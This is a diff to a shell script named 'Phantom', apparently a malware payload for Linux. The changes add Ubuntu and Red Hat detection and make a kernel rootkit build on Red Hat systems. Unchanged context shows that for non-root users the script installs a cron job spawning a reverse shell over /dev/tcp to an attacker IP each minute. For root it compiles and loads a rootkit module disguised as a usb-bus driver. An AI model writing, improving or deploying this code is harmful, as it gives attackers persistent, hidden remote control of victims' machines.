@@ -5,7 +5,20 @@ port="9999"
 portp="33333"
 
 echo "---Phantom started---"
-echo "user making the connection: $USER"
+#find the user making the connection
+user=$(whoami)
+echo "user making the connection: $user"
+#find the distribution
+cat /proc/version | grep "Ubuntu" >/dev/null
+if [ "$?" == "0" ]; then
+  distro="ubuntu"
+else
+  cat /proc/version | grep "Red Hat" >/dev/null
+  if [ "$?" == "0" ]; then
+    distro="redhat"
+  fi
+fi
+echo "linux distribution: $distro"
 
 #get the functions and variables needed by payload
 echo "--get needed functions and variables--"
@@ -27,8 +40,8 @@ source /tmp/.variables
 finish
 
 #if the user making the connection is not root add a crontab entry which spawns backdoor bash shells
-if [ "$USER" != "root" ]; then
-  printf "adding crontab for $USER... "
+if [ "$user" != "root" ]; then
+  printf "adding crontab for $user... "
   printf "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1 &'\n" > /tmp/.cron
   crontab /tmp/.cron
   finish
@@ -37,7 +50,7 @@ if [ "$USER" != "root" ]; then
   exit
 fi
 #if the user making the connection is root do the following:
-if [ "$USER" == "root" ]; then
+if [ "$user" == "root" ]; then
   #users=$(cat /etc/passwd | awk -F: '{ print $1 }')
   #read -d + -a usernames <<< "$users"
   #for (( i=0; i < ${#usernames[@]}; i=i+1 )); do
@@ -71,7 +84,13 @@ if [ "$USER" == "root" ]; then
 
   #--make and insert the usb-bus rootkit module--
   echo "--install the rootkit--"
-  #make the usb-bus rootkit module
+
+  #if the distribution is redhat install kernel-devel and modify build accordingly
+  if [ "$distro" == "redhat" ]; then
+    install_pre kernel-devel
+    ln -s -f /usr/src/kernels/*/ /lib/modules/$(uname -r)/build
+  fi
+
   if [ ! -d "/lib/modules/$(uname -r)/kernel/drivers/usb-bus" ]; then
     mkdir /lib/modules/$(uname -r)/kernel/drivers/usb-bus
   fi
@@ -82,7 +101,7 @@ if [ "$USER" == "root" ]; then
   if [ "$?" == "0" ]; then
     echo "done"
 
-  #--if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again--
+  #if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again
   else
     echo "failed, trying some fixes"
     #copy the headers
